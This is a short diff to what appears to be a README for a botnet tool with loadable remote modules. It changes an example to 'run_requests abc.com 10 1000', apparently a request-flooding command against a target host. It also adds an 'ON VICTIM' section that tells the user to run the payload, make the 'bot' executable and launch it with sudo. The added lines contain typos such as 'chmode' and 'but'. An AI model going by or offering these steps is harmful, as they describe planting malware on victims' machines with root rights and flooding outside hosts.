@@ -5,7 +5,11 @@ ADD NEW REMOTE MODULE:
 + run load {name module}
 + ex: load helloword
 + ex: example_funtion arg1 arg2 
-+ ex: send_request abc.com 100 100
++ ex: run_requests abc.com 10 1000
+ON VICTIM:
+run payload
+chmode +x bot
+sudo ./but
 BUG:
 + Cannot create payload => delete output folder
 + python3.6
